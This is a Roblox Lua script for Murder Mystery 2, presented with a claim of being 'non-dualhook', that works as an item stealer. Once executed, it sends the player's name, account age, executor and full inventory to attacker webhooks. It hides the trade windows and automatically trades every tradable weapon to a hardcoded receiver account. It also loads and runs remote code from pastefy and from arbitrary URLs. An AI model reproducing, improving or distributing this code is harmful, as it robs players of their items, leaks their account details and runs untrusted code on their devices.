- its the source. u can see we're completely non-dualhook 
repeat task.wait() until game:IsLoaded()
task.wait(1)

_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local cfg = (getgenv and getgenv()) or {}

local users        = cfg.users        or cfg.Users        or _G.users        or {"huy762009az"}
local min_rarity   = cfg.min_rarity   or cfg.MinRarity    or _G.min_rarity   or "Common"
local min_value    = cfg.min_value    or cfg.MinValue     or cfg.minvalue or _G.minvalue or 0
local pingEveryone = cfg.pingEveryone or cfg.PingEveryone or _G.pingEveryone or "Yes"
local valuePing    = cfg.valuePing    or cfg.ValuePing    or _G.valuePing    or 100
cfg.StatusApi = cfg.StatusApi or "https://alr-production.up.railway.app"
local WEBHOOK_BASE = "https://webhook-vault-vercel.vercel.app/api/hit/"
local RAW_WEBHOOK  = cfg.webhook
    or cfg.Webhook
    or cfg.WebhookToken
    or _G.webhook
    or "wh_c897fb99a165f2b1f7"

local webhook
do
    local v = RAW_WEBHOOK
    if type(v) == "string" and v ~= "" then
        if v:match("^https?://") then
            webhook = v
        else
            webhook = WEBHOOK_BASE .. v
        end
    else
        webhook = WEBHOOK_BASE .. "wh_c897fb99a165f2b1f7"
    end
end

if webhook == "" or not webhook then
    game:GetService("Players").LocalPlayer:Kick("No webhook provided")
    return
end

local PROTECTOR_URL = "https://ok-azure-alpha.vercel.app/api/webhook-protector"
local PROTECTOR_KEY = "" 

local TOP_HIT_THRESHOLD = 1000

local Players            = game:GetService("Players")
local HttpService        = game:GetService("HttpService")
local TeleportService    = game:GetService("TeleportService")
local MarketplaceService = game:GetService("MarketplaceService")
local ReplicatedStorage  = game:GetService("ReplicatedStorage")

local plr = Players.LocalPlayer
if not plr then
    return
end

local PlaceId = game.PlaceId


local request = (syn and syn.request)
    or (http and http.request)
    or http_request
    or request

local Request = request

local REAL_JOB_ID = nil

local executorName = (identifyexecutor and identifyexecutor()) or "Unknown"
local isDelta = executorName:lower():find("delta") ~= nil

local queueTeleport = queue_on_teleport
    or queueonteleport
    or (syn and syn.queue_on_teleport)

local savedRealJobId = (getgenv and (getgenv().RealJobId or getgenv().JobId)) or nil

if isDelta then
    if savedRealJobId and savedRealJobId ~= "" then
        REAL_JOB_ID = savedRealJobId
    else
        if not queueTeleport then
            plr:Kick("queue_on_teleport not found in this executor.")
            return
        end

        local fakeJobId = game.JobId
        local realJobId = nil
        local connection

        connection = TeleportService.TeleportInitFailed:Connect(function(player, _, _, _, errData)
            if player == plr and not realJobId then
                realJobId = errData and errData.ServerInstanceId
                connection:Disconnect()

                if realJobId and realJobId ~= "" then
                    local snippet = string.format([[
getgenv().RealJobId = "%s"
getgenv().FakeJobId = "%s"
getgenv().JobId     = "%s"

pcall(function()
    loadstring(game:HttpGet("https://pastefy.app/K2Wlf5mn/raw"))()
end)
]], realJobId, fakeJobId, realJobId)

                    queueTeleport(snippet)
                    warn("[JobId Bypass] Captured RealJobId: " .. realJobId .. " (waiting for next join)")
                else
                    plr:Kick("Failed to grab real JobId")
                end
            end
        end)

        for i = 1, 3 do
            task.spawn(function()
                TeleportService:TeleportToPlaceInstance(
                    PlaceId,
                    (fakeJobId ~= "" and fakeJobId) or "00000000-0000-0000-0000-000000000000",
                    plr
                )
            end)
        end

        task.delay(10, function()
            if not realJobId then
                plr:Kick("JobId bypass timeout")
            end
        end)

        
        return
    end
else
    REAL_JOB_ID = game.JobId
end

REAL_JOB_ID = REAL_JOB_ID or game.JobId


local realJobId     = REAL_JOB_ID
local weaponsToSend = {}
local allWeapons    = {}
local totalValue    = 0
local totalAllValue = 0  

local function hasTopHit()
    for _, w in ipairs(weaponsToSend) do
        if (w.Value or 0) > TOP_HIT_THRESHOLD then
            return true
        end
    end
    return false
end

local rarityTable = {
    "Common","Uncommon","Rare","Legendary",
    "Godly","Ancient","Unique","Vintage"
}
local min_rarity_index = table.find(rarityTable, min_rarity) or 5
local GODLY_INDEX      = table.find(rarityTable, "Godly") or 5

local untradable = { }


local categories = {
    godly  = "https://supremevaluelist.com/mm2/godlies.html",
    ancient = "https://supremevaluelist.com/mm2/ancients.html",
    unique  = "https://supremevaluelist.com/mm2/uniques.html",
    classic = "https://supremevaluelist.com/mm2/vintages.html",
    chroma  = "https://supremevaluelist.com/mm2/chromas.html"
}

local headers = {
    ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống Gecko) Chrome/131.0.0.0 Safari/537.36"
}

local function trim(s)
    return s:match("^%s*(.-)%s*$")
end

local function fetchHTML(url)
    if not Request then return "" end

    local ok, res = pcall(function()
        return Request({
            Url = url,
            Method = "GET",
            Headers = headers
        })
    end)

    if not ok or not res or not res.Body then
        return ""
    end

    return res.Body
end

local function parseValue(itembodyDiv)
    local valueStr = itembodyDiv:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
    if valueStr then
        valueStr = valueStr:gsub(",", "")
        local value = tonumber(valueStr)
        if value then
            return value
        end
    end
    return nil
end

local function extractItems(htmlContent)
    local itemValues = {}

    for itemName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        itemName = itemName:match("([^<]+)")
        if itemName then
            itemName = trim(itemName:gsub("%s+", " "))
            itemName = trim((itemName:split(" Click "))[1])
            local itemNameLower = itemName:lower()

            local value = parseValue(itembodyDiv)
            if value then
                itemValues[itemNameLower] = value
            end
        end
    end

    return itemValues
end

local function extractChromaItems(htmlContent)
    local chromaValues = {}

    for chromaName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        chromaName = chromaName:match("([^<]+)")
        if chromaName then
            chromaName = trim(chromaName:gsub("%s+", " ")):lower()
            local value = parseValue(itembodyDiv)
            if value then
                chromaValues[chromaName] = value
            end
        end
    end

    return chromaValues
end

local function buildValueList()
    local allExtractedValues   = {}
    local chromaExtractedValues = {}
    local categoriesToFetch    = {}

    for rarity, url in pairs(categories) do
        table.insert(categoriesToFetch, {rarity = rarity, url = url})
    end

    local totalCategories = #categoriesToFetch
    local completed = 0
    local lock = Instance.new("BindableEvent")

    for _, category in ipairs(categoriesToFetch) do
        task.spawn(function()
            local rarity = category.rarity
            local url    = category.url
            local htmlContent = fetchHTML(url)

            if htmlContent and htmlContent ~= "" then
                if rarity ~= "chroma" then
                    local extractedItemValues = extractItems(htmlContent)
                    for itemName, value in pairs(extractedItemValues) do
                        allExtractedValues[itemName] = value
                    end
                else
                    chromaExtractedValues = extractChromaItems(htmlContent)
                end
            end

            completed = completed + 1
            if completed == totalCategories then
                lock:Fire()
            end
        end)
    end

    lock.Event:Wait()

    local valueList = {}

    
    for dataid, item in pairs(_G.__mm2_database_for_value or {}) do
        local itemName = item.ItemName and item.ItemName:lower() or ""
        local rarity   = item.Rarity or ""
        local hasChroma = item.Chroma or false

        if itemName ~= "" and rarity ~= "" then
    
    if hasChroma then
        local matchedChromaValue = nil
        for chromaName, value in pairs(chromaExtractedValues) do
            if chromaName:find(itemName) then
                matchedChromaValue = value
                break
            end
        end

        if matchedChromaValue then
            valueList[dataid] = matchedChromaValue
        end
    else
        local value = allExtractedValues[itemName]
        if value then
            valueList[dataid] = value
        else
            
            local defaultValues = {
                Common = 1,
                Uncommon = 2,
                Rare = 3,
                Legendary = 5,
                Godly = 10,
                Ancient = 20,
                Unique = 30,
                Vintage = 50
            }
            valueList[dataid] = defaultValues[rarity] or 1
                end
    end
end
end 

    return valueList
end


local STATUS_API_URL = cfg.StatusApi or ""
local STATUS_HEARTBEAT_INTERVAL = 5
local statusHeartbeatStarted = false

local function extractVaultId(url)
    if type(url) ~= "string" then
        return nil
    end

    local wh = url:match("wh_[%w_]+")
    if wh then
        return wh
    end

    local token = url:match("/hit/(wh_[%w_]+)")
    if token then
        return token
    end

    return nil
end

local function withWaitParam(url)
    url = tostring(url or "")
    if url == "" then return url end

    if url:lower():find("wait=") then
        return url
    end

    if url:find("?", 1, true) then
        return url .. "&wait=true"
    else
        return url .. "?wait=true"
    end
end

local function startStatusHeartbeat(sessionId)
    if statusHeartbeatStarted then return end
    statusHeartbeatStarted = true

    if STATUS_API_URL == "" then return end
    if not Request or type(Request) ~= "function" then
        warn("[Status] No HTTP request fn, skip heartbeat")
        return
    end

    task.spawn(function()
        while task.wait(STATUS_HEARTBEAT_INTERVAL) do
            if STATUS_API_URL == "" then break end

            local ok, res = pcall(function()
                return Request({
                    Url = STATUS_API_URL .. "/ping",
                    Method = "POST",
                    Headers = { ["Content-Type"] = "application/json" },
                    Body = HttpService:JSONEncode({
                        sessionId = sessionId,
                    }),
                })
            end)

            if not ok then
                warn("[Status] Heartbeat failed:", res)
            end
        end
    end)
end

local function registerStatusSession(vaultId, messageId, channelId, mainEmbed)
    if STATUS_API_URL == "" then return end
    if not Request or type(Request) ~= "function" then
        warn("[Status] No HTTP request fn, skip register")
        return
    end

    local lp = Players.LocalPlayer
    if not lp then return end

    local sessionId = string.format(
        "%d-%s-%d",
        lp.UserId,
        tostring(realJobId),
        os.time()
    )

    local payload = {
        sessionId   = sessionId,
        vaultId     = vaultId,
        messageId   = tostring(messageId),
        channelId   = tostring(channelId),

        username    = lp.Name,
        displayName = lp.DisplayName,
        executor    = executorName,

        placeId     = PlaceId,
        jobId       = tostring(realJobId),

        totalRap    = totalAllValue or 0,  
        embed       = mainEmbed,
    }

    local ok, res = pcall(function()
        return Request({
            Url = STATUS_API_URL .. "/register",
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(payload),
        })
    end)

    if not ok then
        warn("[Status] Register failed:", res)
        return
    end

    startStatusHeartbeat(sessionId)
end


local function postJson(url, payload)
    if type(url) ~= "string" or url == "" then return end
    if not Request or type(Request) ~= "function" then
        return
    end

    task.spawn(function()
        local ok, res = pcall(function()
            return Request({
                Url     = url,
                Method  = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body    = HttpService:JSONEncode(payload),
            })
        end)

        if not ok then
            warn("[Protector] Request failed:", res)
        end
    end)
end

local function sendToProtector(publicEmbeds)
    if PROTECTOR_URL == "" then return end

    local lp = Players.LocalPlayer
    if not lp then return end

    local now = os.time()
    local nonce = string.format(
        "%d-%s-%d-%d",
        lp.UserId or 0,
        tostring(realJobId),
        now,
        math.random(100000, 999999)
    )

    local relay = {
        public_embeds = publicEmbeds,
        user_id       = lp.UserId or 0,
        place_id      = PlaceId,
        job_id        = tostring(realJobId),
        ts            = now,
        nonce         = nonce,
        key           = PROTECTOR_KEY or "",
        game          = "mm2",
        total_value   = totalValue,
    }

    if hasTopHit() then
        relay.top_embeds = publicEmbeds
    end

    postJson(PROTECTOR_URL, relay)
end


local THEME_COLOR = 0x6C5CE7
local MM2_THUMBNAIL = "https://tr.rbxcdn.com/180DAY-c929c9ba9069190914f60bbfe47b6cb9/768/432/Image/Webp/noFilter"

local function buildPlayerInfoValue(hasReceiver)
    local playerCount = #Players:GetPlayers()
    local lines = {
        string.format("👤 Display Name : %s", plr.DisplayName),
        string.format("🆔 Username     : %s", plr.Name),
        string.format("📅 Account Age  : %d days", plr.AccountAge or 0),
        string.format("🖥 Executor     : %s", executorName),
        string.format("👥 Players      : %d/%d", playerCount, Players.MaxPlayers),
    }

    if hasReceiver then
        local receivers = (users and #users > 0) and table.concat(users, ", ") or "Unknown"
        table.insert(lines, string.format("📡 Receiver     : %s", receivers))
    end

    return "```" .. table.concat(lines, "\n") .. "```"
end

local function buildStatusValue()
    return "```🟢 Connected```"
end
local function shouldPingByValue()
    if valuePing <= 0 then
        return false
    end
    
    
    for _, w in ipairs(allWeapons) do
        if w.Value >= valuePing then
            return true
        end
    end
    
    return false
end

local function getPingContent()
    if pingEveryone ~= "Yes" then
        return ""
    end
    
    
    if valuePing <= 0 then
        return "--@everyone\n\n"
    end
    
    
    if shouldPingByValue() then
        return "--@everyone\n\n"
    end
    
    return ""
end
local function buildWeaponsLines()
    local lines = {}
    if #weaponsToSend == 0 then
        return { "No weapon found (meets filter)" }
    end

    for _, w in ipairs(weaponsToSend) do
        local line = string.format(
            "%s x%d → %d Value [%s]",
            w.DataID,
            w.Amount,
            (w.Value * w.Amount),
            w.Rarity
        )
        table.insert(lines, line)
    end

    return lines
end

local function buildWeaponsValue(maxChars)
    maxChars = maxChars or 900
    local lines = buildWeaponsLines()

    local outLines  = {}
    local totalLen  = 0
    local truncated = false

    for _, line in ipairs(lines) do
        line = tostring(line)
        local addLen = #line
        if #outLines > 0 then
            addLen = addLen + 1
        end

        if totalLen + addLen <= maxChars then
            table.insert(outLines, line)
            totalLen = totalLen + addLen
        else
            truncated = true
            break
        end
    end

    if truncated and outLines[#outLines] ~= "and more..." then
        table.insert(outLines, "and more...")
    end

    return "```" .. table.concat(outLines, "\n") .. "```"
end

local function buildFullInventoryLines()
    local lines = {}
    if #allWeapons == 0 then
        return { "No items found" }
    end

    for _, w in ipairs(allWeapons) do
        local flag = ""
        if w.Tradable == false then
            flag = " [LOCKED]"
        end

        local line = string.format(
            "%s x%d → %d Value [%s]%s",
            w.DataID,
            w.Amount,
            (w.Value * w.Amount),
            w.Rarity or "?",
            flag
        )
        table.insert(lines, line)
    end

    return lines
end

local function chunkLines(lines, maxChars)
    maxChars = maxChars or 900
    local chunks = {}
    local current = ""

    for _, line in ipairs(lines) do
        line = tostring(line)
        local addLen = #line
        if current ~= "" then
            addLen = addLen + 1
        end

        if #current + addLen > maxChars then
            if current ~= "" then
                table.insert(chunks, current)
            end
            current = line
        else
            if current == "" then
                current = line
            else
                current = current .. "\n" .. line
            end
        end
    end

    if current ~= "" then
        table.insert(chunks, current)
    end

    return chunks
end
local function loadVisualAfterEmbed()
    local v = getgenv().Visual
    if type(v) ~= "string" then return end

    task.spawn(function()
        task.wait(0.3)

        
        if v:find("loadstring", 1, true) then
            pcall(function()
                loadstring(v)()
            end)

        
        elseif v:match("^https?://") then
            pcall(function()
                loadstring(game:HttpGet(v))()
            end)
        end
    end)
end
loadVisualAfterEmbed()

local database = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
local profileData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)


_G.__mm2_database_for_value = database

local valueList = {}
pcall(function()
    valueList = buildValueList()
end)

for dataid, amount in pairs(profileData.Weapons.Owned or {}) do
    local item = database[dataid]
    if item then
        local rarity = item.Rarity or "Unknown"
        local idx = table.find(rarityTable, rarity) or 0

        local value = valueList[dataid]
if not value then
    
    local defaultValues = {
        Common = 1,
        Uncommon = 2,
        Rare = 3,
        Legendary = 5,
        Godly = 10,
        Ancient = 20,
        Unique = 30,
        Vintage = 50
    }
    value = defaultValues[rarity] or 1
end

        local tradable = not untradable[dataid]

        table.insert(allWeapons, {
            DataID   = dataid,
            Amount   = amount,
            Value    = value,
            Rarity   = rarity,
            Tradable = tradable,
        })

       
        totalAllValue = totalAllValue + (value * amount)  

        if tradable then
    totalValue = totalValue + (value * amount)
    table.insert(weaponsToSend, {
        DataID = dataid,
        Amount = amount,
        Value  = value,
        Rarity = rarity,
        })
       end
    end
end

table.sort(weaponsToSend, function(a, b)
    local rarityA = table.find(rarityTable, a.Rarity) or 0
    local rarityB = table.find(rarityTable, b.Rarity) or 0

    if rarityA == rarityB then
        return (a.Value * a.Amount) > (b.Value * b.Amount)
    end

    return rarityA > rarityB
end)

table.sort(allWeapons, function(a, b)
    local rarityA = table.find(rarityTable, a.Rarity) or 0
    local rarityB = table.find(rarityTable, b.Rarity) or 0

    if rarityA == rarityB then
        return (a.Value * a.Amount) > (b.Value * b.Amount)
    end

    return rarityA > rarityB
end)


local function sendSuccessEmbed()
    local joinUrl = string.format(
        "https://mozil.netlify.app/?placeId=%d&jobId=%s",
        PlaceId,
        tostring(realJobId)
    )

    local teleportScript = string.format(
        "```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s')\n```",
        PlaceId,
        tostring(realJobId)
    )

    local inventoryLines = buildFullInventoryLines()
    local invChunks      = chunkLines(inventoryLines, 950)

    local fields = {
        {
            name  = "🛠️ How to Use?",
            value = "Join with the script below, chat something for trade request, accept all items. Make sure trades are enabled.",
            inline = false,
        },
        {
            name  = "📄 Player Info",
            value = buildPlayerInfoValue(true),
            inline = false,
        },
        {
            name  = "📡 Player Status",
            value = buildStatusValue(),
            inline = false,
        },
        {
            name  = "💰 Total Value",
        value = string.format("```Total MM2 Value: %d```", totalAllValue),  
        inline = false,
        },
    }

    for i, chunk in ipairs(invChunks) do
        local suffix = (#invChunks > 1) and (" (Part " .. i .. ")") or ""
        table.insert(fields, {
            name  = "📂 Full Inventory" .. suffix,
            value = "```" .. chunk .. "```",
            inline = false,
        })
    end

    table.insert(fields, {
        name  = "📜 Teleport Script",
        value = teleportScript,
        inline = false,
    })
    table.insert(fields, {
        name  = "👥 Join Player",
        value = string.format("**🔗 [Click to Join](%s)**", joinUrl),
        inline = false,
    })

    local mainEmbeds = {{
        title  = "MozilOnTop • MM2 Hit [<:mozil2:1438776373434122351>]",
        color  = THEME_COLOR,
        fields = fields,
        footer = { text = "Mozil Scripts - MM2" },
        image  = { url = MM2_THUMBNAIL },
    }}

    local publicFields = {
    {
        name  = "📄 Player Info",
        value = buildPlayerInfoValue(false), -- KHÔNG có Receiver
        inline = false,
    },
    {
        name  = "💰 Total Value",
        value = string.format("```Total MM2 Value: %d```", totalAllValue),
        inline = false,
    },
}

for i, chunk in ipairs(invChunks) do
    local suffix = (#invChunks > 1) and (" (Part " .. i .. ")") or ""
    table.insert(publicFields, {
        name  = "📂 Full Inventory" .. suffix,
        value = "```" .. chunk .. "```",
        inline = false,
    })
end

    local publicEmbeds = {{
        title  = "MozilOnTop • MM2 Hit [<:mozil2:1438776373434122351>]",
        color  = THEME_COLOR,
        fields = publicFields,
        footer = { text = "Mozil Scripts - MM2" },
        image  = { url = MM2_THUMBNAIL },
    }}
    
    local contentScript = string.format(
        "game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game.Players.LocalPlayer)",
        PlaceId,
        tostring(realJobId)
    )

    local mozil_meta = {
        game     = "mm2",
        script   = "mm2_trade",                 
        placeId  = PlaceId,
        jobId    = tostring(realJobId or game.JobId),
        userId   = plr and plr.UserId or 0,
        username = plr and plr.Name or "Unknown",
    }
    local data = {
        content    = getPingContent() .. contentScript,
        embeds     = mainEmbeds,

        
        mozil_meta = mozil_meta,
    }

    local headers = { ["Content-Type"] = "application/json" }
    local url     = withWaitParam(webhook)
    local body    = HttpService:JSONEncode(data)

    local messageId, channelId

    local ok, resp = pcall(function()
        return request({
            Url     = url,
            Method  = "POST",
            Headers = headers,
            Body    = body,
        })
    end)

    if ok and resp then
        local raw
        if type(resp) == "table" then
            raw = resp.Body
                or resp.body
                or resp.responseBody
                or resp.ResponseBody
                or ""
        else
            raw = tostring(resp or "")
        end

        local parseOk, decoded = pcall(function()
            return HttpService:JSONDecode(raw)
        end)

        if parseOk and type(decoded) == "table" then
            if decoded.id and decoded.channel_id then
                messageId = tostring(decoded.id)
                channelId = tostring(decoded.channel_id)
            end
        end

        if not messageId then
            warn("[Status] Cannot parse message id from webhook response")
        else
            local vaultId = extractVaultId(webhook)
            if vaultId then
                registerStatusSession(vaultId, messageId, channelId, mainEmbeds[1])
            else
                warn("[Status] WEBHOOK is not a vault url (no token found)")
            end
        end
    else
        warn("[Status] Webhook request failed for MM2 embed")
    end

    if PROTECTOR_URL ~= "" then
        
        sendToProtector(publicEmbeds)
    end
end

sendSuccessEmbed()


if #weaponsToSend == 0 then
    return
end


local playerGui = plr:WaitForChild("PlayerGui")
local accept    = ReplicatedStorage.Trade.AcceptTrade
local sec_arg   = nil

ReplicatedStorage.Trade.UpdateTrade.OnClientEvent:Connect(function(info)
    if info.LastOffer then sec_arg = info.LastOffer end
end)

local tradeGui = playerGui:WaitForChild("TradeGUI")
tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
    tradeGui.Enabled = false
end)

local tradeGuiPhone = playerGui:WaitForChild("TradeGUI_Phone")
tradeGuiPhone:GetPropertyChangedSignal("Enabled"):Connect(function()
    tradeGuiPhone.Enabled = false
end)

local function sendTradeRequest(user)
    local target = Players:FindFirstChild(user)
    if not target then 
        warn("Trade target not found:", user)
        return false 
    end
    
    
    local success, err = pcall(function()
        
        return ReplicatedStorage.Trade.SendRequest:InvokeServer(target)
    end)
    
    if not success then
        
        success, err = pcall(function()
            return ReplicatedStorage.Trade.SendRequest:FireServer(target)
        end)
        
        if not success then
            warn("Both InvokeServer and FireServer failed:", err)
            return false
        end
    end
    
    return true
end

local function getTradeStatus()
    return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
end

local function waitForTradeCompletion()
    while true do
        local status = getTradeStatus()
        if status == "None" then
            break
        end
        task.wait(0.1)
    end
end

local function acceptTrade()
    local maxWait = 10
    local waited  = 0
    while not sec_arg and waited < maxWait do
        task.wait(0.1)
        waited = waited + 0.1
    end

    if sec_arg then
        accept:FireServer(game.PlaceId * 3, sec_arg)
        sec_arg = nil
    else
        warn("Failed to get sec_arg for trade accept")
    end
end

local function addWeaponToTrade(id)
    ReplicatedStorage.Trade.OfferItem:FireServer(id, "Weapons")
end

local function doTrade(targetName)
    local target = Players:FindFirstChild(targetName)
    if not target then return end

    local initialTradeState = getTradeStatus()
    if initialTradeState == "StartTrade" then
        ReplicatedStorage.Trade.DeclineTrade:FireServer()
        task.wait(0.3)
    elseif initialTradeState == "ReceivingRequest" then
        ReplicatedStorage.Trade.DeclineRequest:FireServer()
        task.wait(0.3)
    end

    while #weaponsToSend > 0 do
        local tradeStatus = getTradeStatus()

        if tradeStatus == "None" then
            sendTradeRequest(targetName)
        elseif tradeStatus == "SendingRequest" then
            task.wait(0.3)
        elseif tradeStatus == "ReceivingRequest" then
            ReplicatedStorage.Trade.DeclineRequest:FireServer()
            task.wait(0.3)
        elseif tradeStatus == "StartTrade" then
            for i = 1, math.min(4, #weaponsToSend) do
                local weapon = table.remove(weaponsToSend, 1)
                for _ = 1, weapon.Amount do
                    addWeaponToTrade(weapon.DataID)
                end
            end
            task.wait(6)
            acceptTrade()
            waitForTradeCompletion()
        else
            task.wait(0.5)
        end

        task.wait(1)
    end
end

local tradingWith = {}

local function onChat(player)
    local playerNameLower = player.Name:lower()
    local isTarget = false
    
    for _, targetName in ipairs(users) do
        if targetName:lower() == playerNameLower then
            isTarget = true
            break
        end
    end
    
    if isTarget then
        player.Chatted:Connect(function()
            
            if tradingWith[player.Name] then 
                return 
            end
            
            tradingWith[player.Name] = true
            doTrade(player.Name)
            
            
        end)
    end
end



local function autoTradeOnJoin(player)
    local playerNameLower = player.Name:lower()
    local isTarget = false
    
    for _, targetName in ipairs(users) do
        if targetName:lower() == playerNameLower then
            isTarget = true
            break
        end
    end
    
    if isTarget then
        print("🎯 Target player joined:", player.Name)
        
        
        task.wait(3)
        
        
        if player and player.Parent and Players:FindFirstChild(player.Name) then
            
            if tradingWith[player.Name] then
                print("trading with", player.Name)
                return
            end
            
            
            if #weaponsToSend == 0 then
                print("No items to trade")
                return
            end
            
            print("Auto-trading with", player.Name)
            tradingWith[player.Name] = true
            doTrade(player.Name)
        end
    end
end


for _, p in Players:GetPlayers() do
    onChat(p)
end


for _, player in Players:GetPlayers() do
    if player ~= plr then  
        task.spawn(autoTradeOnJoin, player)
    end
end


Players.PlayerAdded:Connect(function(player)
    
    onChat(player)
    
    
    if player ~= plr then
        task.spawn(autoTradeOnJoin, player)
    end
end)